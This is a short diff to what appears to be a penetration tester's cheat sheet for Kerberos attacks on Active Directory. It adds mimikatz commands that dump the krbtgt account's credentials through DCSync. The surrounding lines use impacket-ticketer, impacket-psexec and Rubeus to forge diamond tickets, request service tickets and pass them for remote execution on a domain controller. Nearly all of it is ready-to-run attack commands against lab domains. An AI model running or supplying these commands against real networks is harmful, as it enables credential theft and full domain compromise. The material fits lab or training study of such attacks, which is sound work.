@@ -187,6 +187,9 @@ impacket-ticketer -request -domain 'MARVEL.local' -user 'fcastle' -password 'Pas
 export KRB5CCNAME=sanjeet.ccache; impacket-psexec ignite.local/sanjeet@dc.ignite.local -dc-ip 192.168.1.48 -target-ip 192.168.1.48 -k -no-pass
 
 #using the rubeus and mimikatz .
+privilege::debug
+lsadump::dcsync /domain:Marvel.local /user:krbtgt
+
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:fcaslte /ticketuserid:1107 /groups:512 /krbkey:<aes key>
 
 rubeus.exe asktgs /ticket: <paste the above copied ticket> /service:cifs/dc.ignite.local /ptt /nowrap
